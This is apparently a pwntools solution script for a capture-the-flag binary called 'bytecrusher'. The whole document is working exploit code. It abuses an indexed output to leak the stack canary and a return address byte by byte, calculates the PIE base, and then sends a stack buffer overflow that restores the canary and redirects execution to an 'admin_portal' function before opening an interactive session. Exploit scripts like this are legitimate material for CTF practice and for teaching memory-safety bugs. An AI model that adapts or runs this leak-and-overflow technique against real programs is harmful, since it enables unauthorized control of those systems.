from pwn import *

p = process('./bytecrusher')

def do_trial(inp, rate, leng):
    p.sendafter(b"crush:\n", inp[:31] + b"\n")
    p.sendlineafter(b"rate:\n", str(rate).encode())
    p.sendlineafter(b"length:\n", str(leng).encode())
    p.recvuntil(b"Crushed string:\n")
    return p.recvline()

def do_leak(idx):
    raw = do_trial(b"A" * 31, idx, 3)
    if len(raw) >= 2 and raw[0:1] == b"A":
        return raw[1]
    return 0x00


p.recvuntil(b"We are happy to offer sixteen free trials of our premium service.\n")

canary = b"\x00"
for i in range(7):
    res = do_leak(73 + i)
    canary += res.to_bytes()
canary = u64(canary)
log.success(f"Canary : {hex(canary)}")

ret = b""
for i in range(6):
    res = do_leak(88 + i)
    ret += res.to_bytes()
ret += b"\x00\x00"
ret = u64(ret)
pie_base = ret - 0x15ec
log.success(f"PIE Base : {hex(pie_base)}")
for i in range(3):
    do_leak(3)

admin_portal = pie_base + 0x12a9
payload = b"A" * 24 + p64(canary) + b"B" * 8 + p64(admin_portal)
p.sendlineafter(b"text:\n", payload)
p.interactive()